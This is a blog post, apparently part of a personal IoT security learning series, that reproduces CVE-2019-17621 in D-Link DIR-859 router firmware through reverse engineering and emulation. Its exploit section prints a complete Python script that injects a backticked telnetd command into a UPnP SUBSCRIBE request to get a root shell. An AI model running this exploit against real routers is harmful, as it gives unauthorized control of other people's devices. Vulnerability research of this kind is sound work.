<!DOCTYPE html>
<html>
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
    
<link rel="stylesheet" href="/css/reset.css">

    
<link rel="stylesheet" href="/css/style.css">

    
<link rel="stylesheet" href="/css/markdown.css">

    
<link rel="stylesheet" href="/css/fonts.css">

<meta name="generator" content="Hexo 6.2.0"></head>
    <body>
        <div class="paper">
            <div class="paper-main">
                
                    <div class="post-header">
    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
    <a class="go-home" href="/">
        <svg width="8" height="14" viewBox="0 0 8 14">
            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
    </a>
</div>
                
                <div class="post-main">

    
    
        <div class="post-main-title">
            【IOT 学习三】DLink路由器RCE漏洞 CVE-2019-17621复现
        </div>
        <div class="post-meta">
            2023-11-16
        </div>
        <div class="post-md">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
<p>链接：<a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17621#:~:text=%EE%80%80CVE-2019-17621%EE%80%80">CVE - CVE-2019-17621 (mitre.org)</a>. The UPnP endpoint URL %2Fgena.cgi in the,UPnP service when connecting to the local network.)</p>
<p>The UPnP endpoint URL &#x2F;gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network.</p>
</blockquote>
<p>以上是官网的描述，我自己粗略的翻译下：</p>
<blockquote>
<p>D-Link DIR-859 Wi-Fi路由器的1.05与1.06B01 Beta01版固件中UPnP的gena.cgi，允许未经身份验证的远程攻击者，在连接到本地网络时，通过向UPnP发送特定的HTTP SUBSCRIBE请求，从而实现以root身份执行系统命令</p>
</blockquote>
<h2 id="UPnP介绍"><a href="#UPnP介绍" class="headerlink" title="UPnP介绍"></a>UPnP介绍</h2><p>在分析前我们首先要了解,什么是<strong>UPnP</strong></p>
<p>我们说的<strong>UPnP（Universal Plug and Play）</strong>即通用即插即用协议，其作用gena.cgi简单来说就是可以当我们支持UNPN协议的设备开启该协议，当主机或主机上的应用程序向该设备发出端口映射请求时，我们的设备就会自动为主机分配端口并进行端口映射，该协议也是从PNP协议里引申出来的</p>
<p>这里我也说一下传统使用协议的PNP协议，即 “即插即用”，该协议支持自动为新添加的硬件分配中断和 I&#x2F;O 端口，用户无须再做手工跳线，也不必使用软件配置程序。</p>
<p>而所谓做手工跳线，我们就不得不说最原始的添加设备的方法了，在这两种协议出现之前，如果我们新添加了硬件，需要我们手动为新加的硬件设置终端和I&#x2F;O端口，我们所说的手工跳线，就是我们新加硬件之后就要在相应的针脚上用小跳线插一下，这对用户的要求十分的高，效率也十分低下。</p>
<p>关于<strong>UPnP</strong>这里就不详述啦，下面我们就开始正式的分析</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>首先我们将固件下载下来：<a target="_blank" rel="noopener" href="https://github.com/Loora1N/IOT-Frimware/tree/main/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6/DIR822A1">DIR822A1_FW103WWb03_(github.com)</a></p>
<p>利用binwalk将<code>.bin</code>文件分解，以获取其目录结构</p>
<pre><code class="bash">binwalk -eM DIR822A1_FW103WWb03.bin
</code></pre>
<p>进入root文件夹，我们可以看到其目录结构</p>
<p><img src="/img/article/iot-3/image-20220916150517246.png" alt="image-20220916150517246"></p>
<p>进入<code>htdocs</code>目录，找到<code>cgibin</code>，利用IDA PRO对其进行逆向分析, 并搜索<code>gena.cgi</code></p>
<p><img src="/img/article/iot-3/image-20220916152135019.png" alt="image-20220916152135019"></p>
<p>可以看到调用了<code>genacgi_main()</code>函数，跟进</p>
<p><img src="/img/article/iot-3/image-20220916152713992.png" alt="image-20220916152713992"></p>
<p>可以发现，如果请求方式是<code>SUBSCRIBE</code>，会进入<code>sub_40FCE0</code>函数，跟进</p>
<p><img src="/img/article/iot-3/image-20220916153633146.png" alt="image-20220916153633146"></p>
<p>发现调用<code>xmldbc_ephp</code>函数</p>
<p><img src="/img/article/iot-3/image-20220916154509242.png" alt="image-20220916154509242"></p>
<p>其中a3是传入的报文，继续不断跟进，最后我们在<code>sub_41484C</code>中，看到报文被发送，这里的<code>a2</code>便是报文</p>
<p><img src="/img/article/iot-3/image-20220916155952769.png" alt="image-20220916155952769"></p>
<p>由前面的报文内容可知，其被传入了<code>run.NOTIFY.php</code>。</p>
<p><img src="/img/article/iot-3/image-20220916160304794.png" alt="image-20220916160304794"></p>
<p>在文件结构内搜索<code>run.NOTIFY.php</code>，并查看文件内容。</p>
<p><img src="/img/article/iot-3/image-20220916160413527.png" alt="image-20220916160413527"></p>
<pre><code class="php">&lt;?
include &quot;/htdocs/phplib/upnp/xnode.php&quot;;
include &quot;/htdocs/upnpinc/gvar.php&quot;;
include &quot;/htdocs/upnpinc/gena.php&quot;;

$gena_path = XNODE_getpathbytarget($G_GENA_NODEBASE, &quot;inf&quot;, &quot;uid&quot;, $INF_UID, 1);
$gena_path = $gena_path.&quot;/&quot;.$SERVICE;
GENA_subscribe_cleanup($gena_path);

/* IGD services */
if		($SERVICE == &quot;L3Forwarding1&quot;)	$php = &quot;NOTIFY.Layer3Forwarding.1.php&quot;;
else if ($SERVICE == &quot;OSInfo1&quot;)			$php = &quot;NOTIFY.OSInfo.1.php&quot;;
else if ($SERVICE == &quot;WANCommonIFC1&quot;)	$php = &quot;NOTIFY.WANCommonInterfaceConfig.1.php&quot;;
else if ($SERVICE == &quot;WANEthLinkC1&quot;)	$php = &quot;NOTIFY.WANEthernetLinkConfig.1.php&quot;;
else if ($SERVICE == &quot;WANIPConn1&quot;)		$php = &quot;NOTIFY.WANIPConnection.1.php&quot;;
/* WFA services */
else if ($SERVICE == &quot;WFAWLANConfig1&quot;)	$php = &quot;NOTIFY.WFAWLANConfig.1.php&quot;;


if ($METHOD == &quot;SUBSCRIBE&quot;)
&#123;
    if ($SID == &quot;&quot;)
        GENA_subscribe_new($gena_path, $HOST, $REMOTE, $URI, $TIMEOUT, $SHELL_FILE, &quot;/htdocs/upnp/&quot;.$php, $INF_UID);
    else
        GENA_subscribe_sid($gena_path, $SID,  $TIMEOUT);
&#125;
else if ($METHOD == &quot;UNSUBSCRIBE&quot;)
&#123;
    GENA_unsubscribe($gena_path, $SID);
&#125;
?&gt;
</code></pre>
<p>当方法为<strong>SUBSCRIBE</strong>时会调用<code>GENA_subscribe_new</code>，利用<code>vscode</code>我们可以直接查看<code>GENA_subscribe_new</code>函数定义,并了解其定义在<code>gena.php</code>内</p>
<p><img src="/img/article/iot-3/image-20220916161121953.png" alt="image-20220916161121953"></p>
<pre><code class="php">function GENA_subscribe_new($node_base, $host, $remote, $uri, $timeout, $shell_file, $target_php, $inf_uid)
&#123;
    anchor($node_base);
    $count = query(&quot;subscription#&quot;);
    $found = 0;
    /* find subscription index &amp; uuid */
    foreach (&quot;subscription&quot;)
    &#123;
        if (query(&quot;host&quot;)==$host &amp;&amp; query(&quot;uri&quot;)==$uri)	&#123;$found = $InDeX; break;&#125;
    &#125;
    if ($found == 0)
    &#123;
        $index = $count + 1;
        $new_uuid = &quot;uuid:&quot;.query(&quot;/runtime/genuuid&quot;);
    &#125;
    else
    &#123;
        $index = $found;
        $new_uuid = query(&quot;subscription:&quot;.$index.&quot;/uuid&quot;);
    &#125;

    /* get timeout */
    if ($timeout==0 || $timeout==&quot;&quot;) &#123;$timeout = 0; $new_timeout = 0;&#125;
    else &#123;$new_timeout = query(&quot;/runtime/device/uptime&quot;) + $timeout;&#125;
    /* set to nodes */
    set(&quot;subscription:&quot;.$index.&quot;/remote&quot;,	$remote);
    set(&quot;subscription:&quot;.$index.&quot;/uuid&quot;,		$new_uuid);
    set(&quot;subscription:&quot;.$index.&quot;/host&quot;,		$host);
    set(&quot;subscription:&quot;.$index.&quot;/uri&quot;,		$uri);
    set(&quot;subscription:&quot;.$index.&quot;/timeout&quot;,	$new_timeout);
    set(&quot;subscription:&quot;.$index.&quot;/seq&quot;, &quot;1&quot;);

    GENA_subscribe_http_resp($new_uuid, $timeout);
    GENA_notify_init($shell_file, $target_php, $inf_uid, $host, $uri, $new_uuid);
&#125;
</code></pre>
<p>我们查看调用了<code>shell_file</code>的函数<code>GENA_notify_init</code>，继续跟进</p>
<pre><code class="php">function GENA_notify_init($shell_file, $target_php, $inf_uid, $host, $uri, $sid)
&#123;

    $inf_path = XNODE_getpathbytarget(&quot;&quot;, &quot;inf&quot;, &quot;uid&quot;, $inf_uid, 0);
    if ($inf_path==&quot;&quot;)
    &#123;
        TRACE_debug(&quot;can&#39;t find inf_path by $inf_uid=&quot;.$inf_uid.&quot;!&quot;);
        return &quot;&quot;;
    &#125;
    $phyinf = PHYINF_getifname(query($inf_path.&quot;/phyinf&quot;));
    if ($phyinf == &quot;&quot;)
    &#123;
        TRACE_debug(&quot;can&#39;t get phyinf by $inf_uid=&quot;.$inf_uid.&quot;!&quot;);
        return &quot;&quot;;
    &#125;

    $upnpmsg = query(&quot;/runtime/upnpmsg&quot;);
    if ($upnpmsg == &quot;&quot;) $upnpmsg = &quot;/dev/null&quot;;
    fwrite(w, $shell_file,
        &quot;#!/bin/sh\n&quot;.
        &#39;echo &quot;[$0] ...&quot; &gt; &#39;.$upnpmsg.&quot;\n&quot;.
        &quot;xmldbc -P &quot;.$target_php.
            &quot; -V INF_UID=&quot;.$inf_uid.
            &quot; -V HDR_URL=&quot;.SECURITY_prevent_shell_inject($uri).
            &quot; -V HDR_HOST=&quot;.SECURITY_prevent_shell_inject($host).
            &quot; -V HDR_SID=&quot;.SECURITY_prevent_shell_inject($sid).
            &quot; -V HDR_SEQ=0&quot;.
            &quot; | httpc -i &quot;.$phyinf.&quot; -d &quot;.SECURITY_prevent_shell_inject($host).&quot; -p TCP &gt; &quot;.$upnpmsg.&quot;\n&quot;
    );
    fwrite(a, $shell_file, &quot;rm -f &quot;.$shell_file.&quot;\n&quot;);
&#125;
</code></pre>
<p>在函数<code>GENA_notify_init</code>中，会两次调用<code>fwrite</code>写入一个shell脚本。由之前的报文可知<code>$shell_file</code>是通过<code>.sh</code>形式传入。第一次调用<code>fwrite</code>，创建.sh文件；而在第二次调用中，利用<code>fwrite</code>向.sh文件中写入<code>&quot;rm -f &quot;.$shell_file.&quot;\n&quot;</code>的删除命令。</p>
<blockquote>
<p>这里需要讲到一个机制，shell命令中会将&#96;&#96;包裹的内容作为变量，即会先执行其中中的内容 </p>
</blockquote>
<p><img src="/img/article/iot-3/image-20220916165317731.png" alt="image-20220916165317731"></p>
<p>那么只需要插入一个反引号包裹的系统命令，将其注入到<strong>shell</strong>脚本中，当脚本执行<code>rm</code>命令时遇到反引号将失败，继续执行引号里面的系统命令，从而达到远程命令执行漏洞的触发。因此，控制好<code>&quot;/gena.cgi?service=shell_file&quot;</code>中<strong>shell_file</strong>的内容为反引号包裹的系统命令，就可以触发漏洞。</p>
<h2 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h2><blockquote>
<p>环境搭建方法可见上一篇文章<a href="https://loora1n.github.io/2022/09/15/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%BA%8C%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">【IOT 学习二】固件分析与漏洞利用 - 鷺雨のBlog (loora1n.github.io)</a></p>
</blockquote>
<p>首先利用<strong>fat</strong>完成固件仿真</p>
<p><img src="/img/article/iot-3/image-20220916163243521.png" alt="image-20220916163243521"></p>
<p>通过<code>nmap</code>命令我们可以确定，固件环境是否仿真成功。这里我们可以看到，几个端口已经打开</p>
<p><img src="/img/article/iot-3/image-20220916163335524.png" alt="image-20220916163335524"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code class="python">import socket
import os
from time import sleep
# Exploit By Miguel Mendez &amp; Pablo Pollanco
def httpSUB(server, port, shell_file):
    print(&#39;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#39;).format(host=server, port=port)
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = &quot;SUBSCRIBE /gena.cgi?service=&quot; + str(shell_file) + &quot; HTTP/1.0\n&quot;
    request += &quot;Host: &quot; + str(server) + str(port) + &quot;\n&quot;
    request += &quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;
    request += &quot;NT: upnp:event\n&quot;
    request += &quot;Timeout: Second-1800\n&quot;
    request += &quot;Accept-Encoding: gzip, deflate\n&quot;
    request += &quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;
    sleep(1)
    print(&#39;[*] Sending Payload&#39;)
    con.connect((socket.gethostbyname(server),port))
    con.send(request.encode())
    results = con.recv(4096)
    sleep(1)
    print(&#39;[*] Running Telnetd Service&#39;)
    sleep(1)
    print(&#39;[*] Opening Telnet Connection\n&#39;)
    sleep(2)
    os.system(&#39;telnet &#39; + str(server) + &#39; 9999&#39;)
serverInput = raw_input(&#39;IP Router: &#39;)
portInput = 49152
httpSUB(serverInput, portInput, &#39;`telnetd -p 9999 &amp;`&#39;)
</code></pre>
<h3 id="EXP讲解"><a href="#EXP讲解" class="headerlink" title="EXP讲解"></a>EXP讲解</h3><p>我们注意到，其固件启动了telnet服务。我们可以利用反引号 ,将<code>telnet -p 9999 &amp;</code> 包裹，并传入变量$shell_file让其开放9999端口，随后本机连接即可。</p>
<p>运行脚本后，我们可以直接拿到<code>shell</code>,同时用<code>nmap</code>扫描ip可以看到9999端口确实已经开放了。</p>
<p><img src="/img/article/iot-3/image-20220916170501767.png" alt="image-20220916170501767"></p>

        </div>

    

</div>
                <div class="footer">
    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
</div>


<link rel="stylesheet" href="/css/a11y-dark.min.css">


<script src="/js/highlight.min.js"></script>


<script src="/js/highlightjs-line-numbers.js"></script>


<script>
    hljs.initHighlightingOnLoad();
    hljs.initLineNumbersOnLoad();
</script>

            </div>
        </div>
    <!-- hexo injector body_end start -->
  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
  <script data-pjax>
        function GithubCalendarConfig(){
            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
            var git_user ="Loora1N";
            var parent_div_git = document.getElementById('recent-posts');
            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
            if(parent_div_git && location.pathname =='/about/'){
                console.log('已挂载github calendar')
                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
            };
            GithubCalendar(git_githubapiurl,git_color,git_user)
        }
        if(document.getElementById('recent-posts')){
            GithubCalendarConfig()
        }
    </script>
    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
    <style></style><!-- hexo injector body_end end --></body>
</html>